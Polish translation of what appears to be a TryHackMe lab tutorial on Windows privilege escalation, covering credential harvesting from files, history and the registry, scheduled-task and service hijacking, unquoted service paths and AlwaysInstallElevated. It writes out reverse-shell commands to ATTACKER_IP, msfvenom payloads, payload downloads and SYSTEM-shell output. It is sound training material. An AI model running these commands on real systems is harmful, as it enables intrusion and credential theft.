---

Mówiąc najprościej, eskalacja uprawnień polega na wykorzystaniu przyznanego dostępu do hosta z „użytkownikiem A” i wykorzystaniu go do uzyskania dostępu do „użytkownika B” poprzez wykorzystanie słabości systemu docelowego. Chociaż zazwyczaj chcemy, aby „użytkownik B” miał uprawnienia administracyjne, mogą wystąpić sytuacje, w których będziemy musieli eskalować uprawnienia do innych kont bez uprawnień, zanim faktycznie uzyskamy uprawnienia administracyjne.

Uzyskanie dostępu do różnych kont może być tak proste, jak znalezienie danych uwierzytelniających w plikach tekstowych lub arkuszach kalkulacyjnych pozostawionych bez zabezpieczeń przez nieostrożnego użytkownika, ale nie zawsze tak będzie. W zależności od sytuacji, może zaistnieć konieczność wykorzystania poniższych słabości:

- Błędne konfiguracje usług systemu Windows lub zaplanowanych zadań
- Nadmierne uprawnienia przypisane do naszego konta
- Oprogramowanie podatne na ataki
- Brakujące poprawki zabezpieczeń systemu Windows

Zanim przejdziemy do konkretnych technik, przyjrzyjmy się różnym typom kont w systemie Windows.

## Użytkownicy systemu Windows

W systemach Windows  występują zasadniczo  dwa rodzaje użytkowników. W zależności od poziomu dostępu, możemy przypisać użytkownika do jednej z następujących grup:

|**Administratorzy** |Ci użytkownicy mają największe uprawnienia. Mogą zmieniać dowolne parametry konfiguracji systemu i uzyskiwać dostęp do dowolnego pliku w systemie.|
|**Użytkownicy standardowi**| Ci użytkownicy mają dostęp do komputera, ale mogą wykonywać tylko ograniczone zadania. Zazwyczaj nie mogą wprowadzać trwałych ani istotnych zmian w systemie i są ograniczeni do swoich plików.|

Każdy użytkownik z uprawnieniami administracyjnymi będzie należał do grupy **Administratorzy** . Natomiast użytkownicy standardowi będą należeć do grupy **Użytkownicy** .

Oprócz tego zazwyczaj usłyszysz o pewnych specjalnych wbudowanych kontach używanych przez system operacyjny w kontekście eskalacji uprawnień:

|   |   |
|---|---|
|**SYSTEM / System lokalny**|Konto używane przez system operacyjny do wykonywania zadań wewnętrznych. Ma pełny dostęp do wszystkich plików i zasobów dostępnych na hoście, z jeszcze większymi uprawnieniami niż administratorzy.|
|**Usługa lokalna**|Domyślne konto używane do uruchamiania usług systemu Windows z uprawnieniami „minimalnymi”. Będzie ono korzystać z anonimowych połączeń sieciowych.|
|**Usługa sieciowa**|Domyślne konto używane do uruchamiania usług systemu Windows z uprawnieniami „minimalnymi”. Do uwierzytelniania w sieci używa danych logowania komputera.|

Te konta są tworzone i zarządzane przez system Windows i nie można ich używać tak jak zwykłych kont. Mimo to w niektórych sytuacjach można uzyskać do nich uprawnienia dzięki wykorzystaniu określonych usług.

## Zbieranie haseł z popularnych miejsc

Najprostszym sposobem uzyskania dostępu do innego użytkownika jest zebranie danych uwierzytelniających z zainfekowanego komputera. Takie dane uwierzytelniające mogą istnieć z wielu powodów, na przykład z powodu nieostrożnego użytkownika, który zostawił je w plikach tekstowych, a nawet przechowywane przez oprogramowanie, takie jak przeglądarki czy klienci poczty e-mail.

W tym zadaniu zaprezentujemy kilka znanych miejsc, w których można szukać haseł w systemie Windows.

Przed rozpoczęciem zadania pamiętaj o kliknięciu przycisku „ **Uruchom maszynę”**  . Będziesz korzystać z tej samej maszyny przez wszystkie zadania od 3 do 5. Jeśli używasz AttackBoxa **,** to również dobry moment na jego uruchomienie, ponieważ będzie on potrzebny do kolejnych zadań.

Jeśli wolisz połączyć się z maszyną docelową za pomocąRDP, możesz użyć następujących danych logowania:

**Użytkownik:** `thm-unpriv`

**Hasło:** `Password321`

## Instalacje systemu Windows bez nadzoru

Podczas instalacji systemu Windows na dużej liczbie hostów administratorzy mogą skorzystać z usług wdrażania systemu Windows, które umożliwiają wdrożenie jednego obrazu systemu operacyjnego na kilku hostach za pośrednictwem sieci. Tego typu instalacje nazywane są instalacjami bezobsługowymi, ponieważ nie wymagają interakcji użytkownika. Wymagają one użycia konta administratora do przeprowadzenia początkowej konfiguracji, która może zostać zapisana na komputerze w następujących lokalizacjach:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

W ramach tych plików możesz natknąć się na następujące dane uwierzytelniające:

```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Historia programu PowerShell

Za każdym razem, gdy użytkownik uruchamia polecenie za pomocą programu PowerShell, jest ono zapisywane w pliku, który przechowuje pamięć poprzednich poleceń. Jest to przydatne do szybkiego powtarzania wcześniej użytych poleceń. Jeśli użytkownik uruchomi polecenie, które zawiera hasło bezpośrednio w wierszu poleceń programu PowerShell, można je później odzyskać za pomocą następującego polecenia w wierszu `cmd.exe`poleceń:

```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Uwaga:** powyższe polecenie będzie działać tylko z poziomu cmd.exe, ponieważPowerShellnie zostanie rozpoznana `%userprofile%`jako zmienna środowiskowa. Aby odczytać plik z programu PowerShell, należy zastąpić `%userprofile%`ją zmienną `$Env:userprofile`. 

## Zapisane poświadczenia systemu Windows

System Windows pozwala nam korzystać z danych logowania innych użytkowników. Ta funkcja daje również możliwość zapisania tych danych w systemie. Poniższe polecenie wyświetli listę zapisanych danych logowania:

```shell-session
cmdkey /list
```

Chociaż nie widzisz samych haseł, jeśli zauważysz jakieś dane uwierzytelniające warte wypróbowania, możesz ich użyć za pomocą polecenia  `runas` i  `/savecred` opcji, jak pokazano poniżej.

```shell-session
runas /savecred /user:admin cmd.exe
```

## Konfiguracja usług IIS

Internet Information Services (IIS) to domyślny serwer WWW w instalacjach systemu Windows. Konfiguracja witryn internetowych w IIS jest przechowywana w pliku o nazwie `web.config`i może przechowywać hasła do baz danych lub skonfigurowane mechanizmy uwierzytelniania. W zależności od zainstalowanej wersjiIIS, plik web.config możemy znaleźć w jednej z następujących lokalizacji:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Oto szybki sposób na znalezienie ciągów połączenia z bazą danych w pliku:

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Pobieranie danych uwierzytelniających z oprogramowania: PuTTY

PuTTY to klient SSH powszechnie spotykany w systemach Windows. Zamiast konieczności każdorazowego określania parametrów połączenia, użytkownicy mogą zapisywać sesje, w których przechowywane są adresy IP, nazwy użytkowników i inne konfiguracje do późniejszego wykorzystania. Chociaż #PuTTY nie pozwala użytkownikom na zapisywanie haseł SSH, przechowuje konfiguracje proxy, które zawierają dane uwierzytelniające w postaci jawnego tekstu.

Aby pobrać zapisane dane uwierzytelniające serwera proxy, wyszukaj ProxyPassword w następującym kluczu rejestru za pomocą następującego polecenia:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

**Uwaga:** Simon Tatham jest twórcą PuTTY (i jego nazwisko jest częścią ścieżki), a nie nazwą użytkownika, dla której pobieramy hasło. ZapisanepełnomocnikNazwa użytkownika powinna być również widoczna po uruchomieniu powyższego polecenia.

Podobnie jak Putty przechowuje dane uwierzytelniające, każde oprogramowanie przechowujące hasła, w tym przeglądarki, klienci poczty e-mail,FTPklienci,SSHKlienci, oprogramowanie VNC i inne będą miały metody umożliwiające odzyskanie haseł zapisanych przez użytkownika.

Eskalacja uprawnień nie zawsze stanowi wyzwanie. Niektóre błędne konfiguracje mogą umożliwić uzyskanie wyższych uprawnień użytkownika, a w niektórych przypadkach nawet dostępu administratora. Warto rozważyć te sytuacje jako należące raczej do kategorii zdarzeń CTF niż scenariuszy, z którymi można się spotkać podczas rzeczywistych testów penetracyjnych. Jeśli jednak żadna z wcześniej wymienionych metod nie zadziała, zawsze można do nich powrócić.

## Zaplanowane zadania

Podczas przeglądania zaplanowanych zadań w systemie docelowym możesz zauważyć, że zadanie zaplanowane albo utraciło swój plik binarny, albo korzysta z pliku binarnego, który możesz zmodyfikować.

Zaplanowane zadania można wyświetlić z poziomu wiersza poleceń za pomocą  `schtasks` polecenia bez żadnych opcji. Aby uzyskać szczegółowe informacje o dowolnej usłudze, można użyć polecenia podobnego do poniższego:

Wiersz poleceń

```shell-session
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Otrzymasz wiele informacji o zadaniu, ale dla nas najważniejszy jest parametr „Zadanie do uruchomienia”, który wskazuje, co zostanie wykonane przez zaplanowane zadanie, oraz parametr „Uruchom jako użytkownik”, który wskazuje użytkownika, który zostanie użyty do wykonania zadania.

Jeśli nasz obecny użytkownik może modyfikować lub nadpisywać plik wykonywalny „Zadanie do uruchomienia”, możemy kontrolować, co zostanie wykonane przez użytkownika taskusr1, co skutkuje prostą eskalacją uprawnień. Aby sprawdzić uprawnienia do pliku wykonywalnego, używamy `icacls`:

Wiersz poleceń

```shell-session
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Jak widać w wynikach, grupa **BUILTIN\Users** ma pełny dostęp (F) do pliku binarnego zadania. Oznacza to, że możemy modyfikować plik .bat i wstawiać dowolny ładunek. Dla wygody `nc64.exe`można go znaleźć na stronie `C:\tools`. Zmieńmy plik bat, aby uruchomić powłokę odwrotną:

Wiersz poleceń

```shell-session
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Następnie uruchamiamy program nasłuchujący na maszynie atakującego, na tym samym porcie, który wskazaliśmy w powłoce odwrotnej:

```shell-session
nc -lvp 4444
```

Przy następnym uruchomieniu zaplanowanego zadania powinieneś otrzymać powłokę odwrotną z uprawnieniami taskusr1. Chociaż prawdopodobnie nie byłbyś w stanie uruchomić zadania w rzeczywistej sytuacji i musiałbyś czekać na jego uruchomienie, nadaliśmy Twojemu użytkownikowi uprawnienia do ręcznego uruchomienia zadania, aby zaoszczędzić Ci czasu. Możemy uruchomić zadanie za pomocą następującego polecenia:

Wiersz poleceń

```shell-session
C:\> schtasks /run /tn vulntask
```

Otrzymasz oczekiwaną powłokę odwrotną z uprawnieniami taskusr1:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\taskusr1
```

Przejdź do pulpitu taskusr1, aby pobrać flagę. Nie zapomnij wpisać flagi na końcu tego zadania.

## Zawsze instaluj podwyższone

Pliki instalatora systemu Windows (znane również jako pliki .msi) służą do instalowania aplikacji w systemie. Zazwyczaj działają z uprawnieniami użytkownika, który je uruchamia. Można je jednak skonfigurować tak, aby działały z wyższymi uprawnieniami z dowolnego konta użytkownika (nawet z konta bez uprawnień). Mogłoby to potencjalnie umożliwić wygenerowanie złośliwego pliku MSI, który działałby z uprawnieniami administratora.

**Uwaga:** metoda AlwaysInstallElevated nie będzie działać na komputerze w tym pomieszczeniu. Została uwzględniona wyłącznie w celach informacyjnych.

Ta metoda wymaga ustawienia dwóch wartości rejestru. Możesz je sprawdzić z poziomu wiersza poleceń, używając poniższych poleceń.

Wiersz poleceń

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Aby wykorzystać tę lukę, należy ustawić oba parametry. W przeciwnym razie wykorzystanie tej luki będzie niemożliwe. Po ustawieniu tych parametrów można wygenerować złośliwy plik .msi  `msfvenom`, jak pokazano poniżej:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

Ponieważ jest to powłoka odwrócona, należy również uruchomić odpowiednio skonfigurowany moduł Metasploit Handler. Po przesłaniu utworzonego pliku można uruchomić instalator za pomocą poniższego polecenia, aby uzyskać powłokę odwróconą:

Wiersz poleceń

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

## Usługi systemu Windows

Usługi systemu Windows są zarządzane przez **Menedżera Kontroli Usług** (SCM). SCM to proces odpowiedzialny za zarządzanie stanem usług w razie potrzeby, sprawdzanie aktualnego stanu danej usługi i ogólnie udostępnianie sposobu jej konfiguracji.

Każda usługa na komputerze z systemem Windows będzie miała powiązany plik wykonywalny, który będzie uruchamiany przez SCM przy każdym uruchomieniu usługi. Należy pamiętać, że pliki wykonywalne usług implementują specjalne funkcje umożliwiające komunikację z SCM, dlatego nie można pomyślnie uruchomić żadnego pliku wykonywalnego jako usługi. Każda usługa określa również konto użytkownika, na którym będzie działać.

Aby lepiej zrozumieć strukturę usługi, sprawdźmy konfigurację usługi apphostsvc za pomocą polecenia `sc qc`:

Wiersz poleceń

```shell-session
C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

Tutaj możemy zobaczyć, że skojarzony plik wykonywalny jest określony za pomocą parametru **BINARY_PATH_NAME** , a konto użyte do uruchomienia usługi jest wyświetlane w parametrze **SERVICE_START_NAME** .

Usługi posiadają listę kontroli dostępu (DACL), która wskazuje, kto ma uprawnienia do uruchamiania, zatrzymywania, wstrzymywania, sprawdzania statusu, sprawdzania konfiguracji lub rekonfigurowania usługi, a także inne uprawnienia. Listę DACL można wyświetlić w programie Process Hacker (dostępnym na pulpicie komputera):

![Usługa DACL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d8244cfd9d64a7be30f5fb0308fd0806.png)  

Wszystkie konfiguracje usług są przechowywane w rejestrze pod adresem `HKLM\SYSTEM\CurrentControlSet\Services\`:

![Wpisy do rejestru usług](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06c05c134e4922ec8ff8d9b56382c58f.png)  

Dla każdej usługi w systemie istnieje podklucz. Ponownie, możemy zobaczyć powiązany plik wykonywalny w wartości **ImagePath** , a konto użyte do uruchomienia usługi w wartości **ObjectName** . JeśliDACLJeśli został skonfigurowany dla usługi, zostanie zapisany w podkluczu o nazwie **Security** . Jak już się domyśliłeś, domyślnie tylko administratorzy mogą modyfikować takie wpisy w rejestrze.

## Niezabezpieczone uprawnienia do pliku wykonywalnego usługi

Jeśli plik wykonywalny powiązany z usługą ma słabe uprawnienia, które pozwalają atakującemu na jego modyfikację lub zastąpienie, atakujący może w prosty sposób uzyskać uprawnienia konta usługi.

Aby zrozumieć, jak to działa, przyjrzyjmy się luce w zabezpieczeniach usługi Splinterware System Scheduler. Na początek zapytamy o konfigurację usługi za pomocą `sc`:

Wiersz poleceń

```shell-session
C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
```

Widzimy, że usługa zainstalowana przez podatne oprogramowanie działa jako svcuser1, a plik wykonywalny powiązany z usługą znajduje się w `C:\Progra~2\System~1\WService.exe`. Następnie sprawdzamy uprawnienia do pliku wykonywalnego:

Wiersz poleceń

```shell-session
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

I tu mamy coś ciekawego. Grupa „Wszyscy” ma uprawnienia do modyfikacji (M) pliku wykonywalnego usługi. Oznacza to, że możemy po prostu nadpisać go dowolnym, wybranym przez nas ładunkiem, a usługa uruchomi go z uprawnieniami skonfigurowanego konta użytkownika.

Wygenerujmy ładunek usługi exe przy użyciu msfvenom i udostępnijmy go za pośrednictwem serwera WWW w języku Python:

Kali Linux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Następnie możemy pobrać ładunek z programu PowerShell za pomocą następującego polecenia:

PowerShell

```shell-session
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Gdy ładunek znajdzie się na serwerze Windows, zastępujemy plik wykonywalny usługi naszym ładunkiem. Ponieważ potrzebujemy innego użytkownika do wykonania naszego ładunku, musimy przyznać pełne uprawnienia również grupie Wszyscy:

Wiersz poleceń

```shell-session
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

Uruchamiamy odwrotnego nasłuchiwacza na maszynie atakującego:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4445
```

Na koniec uruchom ponownie usługę. W normalnym scenariuszu prawdopodobnie musiałbyś poczekać na ponowne uruchomienie usługi, ale masz przypisane uprawnienia do samodzielnego ponownego uruchomienia usługi, co pozwoli Ci zaoszczędzić czas. Użyj poniższych poleceń z wiersza poleceń cmd.exe:

Wiersz poleceń

```shell-session
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

**Uwaga:**  PowerShell ma `sc`alias `Set-Content`, dlatego należy go użyć `sc.exe`, aby w ten sposób sterować usługami przy użyciu programu PowerShell.

W rezultacie otrzymasz odwrotną powłokę z uprawnieniami svcusr1:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

Przejdź do pulpitu svcusr1, aby pobrać flagę. Nie zapomnij wpisać flagi na końcu tego zadania.

## Niezacytowane ścieżki usług

Jeśli nie możemy bezpośrednio zapisywać danych do plików wykonywalnych usługi, jak dotychczas, istnieje wciąż szansa na wymuszenie na usłudze uruchomienia dowolnych plików wykonywalnych za pomocą raczej mało znanej funkcji.

Podczas pracy z usługami systemu Windows, występuje bardzo specyficzne zachowanie, gdy usługa jest skonfigurowana tak, aby wskazywała na plik wykonywalny „bez cudzysłowów”. Przez „bez cudzysłowów” rozumiemy, że ścieżka do powiązanego pliku wykonywalnego nie jest poprawnie ujęta w cudzysłów, aby uwzględnić spacje w poleceniu.

Przyjrzyjmy się na przykład różnicom między dwiema usługami (usługi te służą jedynie jako przykłady i mogą być niedostępne na Twoim komputerze). Pierwsza usługa użyje odpowiedniego cudzysłowu, aby SCM bez wątpienia wiedział, że musi wykonać plik binarny wskazany przez `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, a następnie podane parametry:

Wiersz poleceń

```shell-session
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

**Pamiętaj: w PowerShellu „sc” to alias dla „Set-Content”, dlatego w wierszu poleceń PowerShell musisz używać „sc.exe”, aby kontrolować usługi.**  
Przyjrzyjmy się teraz innej usłudze bez poprawnego cudzysłowu:

Wiersz poleceń

```shell-session
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

Gdy SCM próbuje wykonać powiązany plik binarny, pojawia się problem. Ponieważ nazwa folderu „Disk Sorter Enterprise” zawiera spacje, polecenie staje się niejednoznaczne, a SCM nie wie, który z poniższych elementów próbujesz wykonać:

|Rozkaz|Argument 1|Argument 2|
|---|---|---|
|C:\Moje programy\Dysk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\Moje programy\Sortownik dysków.exe|Enterprise\bin\disksrs.exe||
|C:\Moje programy\Disk Sorter Enterprise\bin\disksrs.exe|||

Ma to związek ze sposobem, w jaki wiersz poleceń analizuje polecenie. Zazwyczaj podczas wysyłania polecenia spacje są używane jako separatory argumentów, chyba że są częścią ciągu znaków w cudzysłowie. Oznacza to, że „prawidłową” interpretacją polecenia bez cudzysłowu byłoby wykonanie go `C:\\MyPrograms\\Disk.exe`i pobranie reszty jako argumentów.

Zamiast zawieść, co prawdopodobnie powinno mieć miejsce, SCM stara się pomóc użytkownikowi i zaczyna przeszukiwać wszystkie pliki binarne w kolejności pokazanej w tabeli:

1. Najpierw wyszukaj `C:\\MyPrograms\\Disk.exe`. Jeśli istnieje, usługa uruchomi ten plik wykonywalny.
2. Jeśli ten ostatni nie istnieje, zostanie wyszukany `C:\\MyPrograms\\Disk Sorter.exe`. Jeśli istnieje, usługa uruchomi ten plik wykonywalny.
3. Jeśli ten ostatni nie istnieje, zostanie wyszukany `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. Oczekuje się, że ta opcja zadziała pomyślnie i zazwyczaj będzie uruchamiana w domyślnej instalacji.

To zachowanie uwidacznia problem. Jeśli atakujący utworzy którykolwiek z plików wykonywalnych, których szuka przed oczekiwanym plikiem wykonywalnym usługi, może wymusić na usłudze uruchomienie dowolnego pliku wykonywalnego.

Choć brzmi to banalnie, większość plików wykonywalnych usług będzie instalowana domyślnie `C:\Program Files`, `C:\Program Files (x86)`co oznacza, że ​​użytkownicy bez uprawnień nie mają do nich dostępu. Zapobiega to wykorzystaniu luk w zabezpieczeniach usług. Istnieją wyjątki od tej reguły: - Niektóre instalatory zmieniają uprawnienia do zainstalowanych folderów, co naraża usługi na ataki. - Administrator może zdecydować o zainstalowaniu plików binarnych usług w ścieżce innej niż domyślna. Jeśli taka ścieżka jest dostępna do zapisu dla wszystkich użytkowników, luka może zostać wykorzystana.

W naszym przypadku administrator zainstalował pliki binarne Disk Sorter w katalogu `c:\MyPrograms`. Domyślnie dziedziczy on uprawnienia katalogu `C:\`, co pozwala każdemu użytkownikowi na tworzenie w nim plików i folderów. Możemy to sprawdzić za pomocą `icacls`:

Wiersz poleceń

```shell-session
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Grupa `BUILTIN\\Users`ma uprawnienia **AD** i **WD** , co pozwala użytkownikowi na tworzenie odpowiednio podkatalogów i plików.

Proces tworzenia ładunku usługi exe za pomocą msfvenom i przesyłania go na host docelowy jest taki sam jak poprzednio, więc możesz utworzyć poniższy ładunek i przesłać go na serwer tak jak poprzednio. Uruchomimy również program nasłuchujący, aby odebrać powłokę odwrotną po jej uruchomieniu:

Kali Linux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446
```

Gdy ładunek znajdzie się na serwerze, przenieś go do dowolnej lokalizacji, w której może dojść do przejęcia. W tym przypadku przeniesiemy ładunek do `C:\MyPrograms\Disk.exe`. Przyznamy również użytkownikowi Everyone pełne uprawnienia do pliku, aby upewnić się, że usługa będzie mogła go uruchomić:

Wiersz poleceń

```shell-session
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Po ponownym uruchomieniu usługi ładunek powinien zostać wykonany:

Wiersz poleceń

```shell-session
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

W rezultacie otrzymasz odwrotną powłokę z uprawnieniami svcusr2:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

Przejdź do pulpitu svcusr2, aby pobrać flagę. Nie zapomnij wpisać flagi na końcu tego zadania.

## Niezabezpieczone uprawnienia do usług

Nadal możesz mieć niewielką szansę na skorzystanie z usługi, jeśli lista DACL plików wykonywalnych usługi jest poprawnie skonfigurowana, a ścieżka dostępu do plików binarnych usługi jest poprawnie zacytowana. Jeśli lista DACL usługi (a nie lista DACL plików wykonywalnych usługi) pozwala na modyfikację konfiguracji usługi, będziesz mógł ją ponownie skonfigurować. Umożliwi to wskazanie dowolnego potrzebnego pliku wykonywalnego i uruchomienie go z dowolnego preferowanego konta, w tym konta SYSTEM.

Aby sprawdzić listę DACL usługi z poziomu wiersza poleceń, możesz użyć [Accesschk(otwiera się w nowej karcie)](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)Z pakietu Sysinternals. Dla Twojej wygody, kopia jest dostępna pod adresem `C:\\tools`. Polecenie sprawdzające usługę thmserviceDACLJest:

Wiersz poleceń

```shell-session
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Tutaj możemy zobaczyć, że `BUILTIN\\Users`grupa ma uprawnienie SERVICE_ALL_ACCESS, co oznacza, że ​​każdy użytkownik może skonfigurować usługę ponownie.

Zanim zmienimy usługę, zbudujmy kolejną odwrotną powłokę usługi exe i uruchommy nasłuchiwanie jej na komputerze atakującego:

Kali Linux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```

Następnie przeniesiemy plik wykonywalny powłoki odwrotnej na maszynę docelową i zapiszemy go w `C:\Users\thm-unpriv\rev-svc3.exe`. Możesz użyć wget, aby przenieść plik wykonywalny do wybranej lokalizacji. Pamiętaj, aby przyznać uprawnienia wszystkim do wykonywania Twojego ładunku:

Wiersz poleceń

```shell-session
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Aby zmienić skojarzony plik wykonywalny i konto usługi, możemy skorzystać z następującego polecenia (podczas korzystania z sc.exe należy pamiętać o spacjach po znakach równości):

Wiersz poleceń

```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Zauważ, że możemy użyć dowolnego konta do uruchomienia usługi. Wybraliśmy konto LocalSystem, ponieważ jest to konto o najwyższych uprawnieniach. Aby uruchomić nasz ładunek, wystarczy zrestartować usługę:

Wiersz poleceń

```shell-session
C:\> sc stop THMService
C:\> sc start THMService
```

Otrzymamy wówczas powłokę na komputerze atakującego z uprawnieniami SYSTEM:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

Przejdź do pulpitu administratora, aby pobrać flagę. Nie zapomnij wpisać flagi na końcu tego zadania.

## Uprawnienia sytemu Windows

